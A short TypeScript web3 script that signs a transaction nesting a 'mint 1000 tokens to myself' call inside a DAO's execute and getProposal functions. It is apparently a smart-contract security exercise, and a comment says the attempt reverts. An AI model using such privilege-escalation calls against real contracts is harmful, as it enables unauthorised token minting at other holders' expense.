import { web3, addressToken, addressDAO, daoABI, mgmtABI, addressMGMT } from './utils/contracts';
import { ownerKey, user2Key } from "./utils/wallets";

async function main() {
    const dao = new web3.eth.Contract(daoABI, addressDAO);
    const mgmt = new web3.eth.Contract(mgmtABI, addressMGMT);

    const user = web3.eth.accounts.privateKeyToAccount(user2Key);
    //This execution is reversed because DAO does not have permission to access the mint
    const calldata = web3.eth.abi.encodeFunctionCall(
        {
            name: "mint",
            type: "function",
            inputs: [
                {
                    type: "address",
                    name: "to",
                },
                {
                    type: "uint256",
                    name: "amount",
                },
            ],
        },
        [user.address, `1000`]
    );

    const functionSignature = web3.eth.abi.encodeFunctionSignature({
        name: 'getProposal',
        type: 'function',
        inputs: [
            {
                type: 'address[]',
                name: 'targets'
            },
            {
                type: 'bytes[]',
                name: 'calldatas'
            },
            {
                type: 'string',
                name: 'description'
            }
        ]
    });

    const encodedParams = web3.eth.abi.encodeParameters(
        ['address[]', 'bytes[]', 'string'],
        [[addressToken], [calldata], 'Gift to myself']
    );
    
    const encodedFunctionCall = functionSignature + encodedParams.slice(2); 
    
    const functionToSend = dao.methods.execute([addressDAO], [encodedFunctionCall], "Execute getProposal");
    const functionABI = functionToSend.encodeABI();

    const transactionObject = {
        from: user.address,
        to: addressDAO,
        gas: 2000000,
        data: functionABI
    };

    const signedTx = await web3.eth.accounts.signTransaction(transactionObject, user2Key);

    let receipt;
    if (signedTx.rawTransaction != undefined) {
        receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    }

    console.log("Transaction receipt:", receipt);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});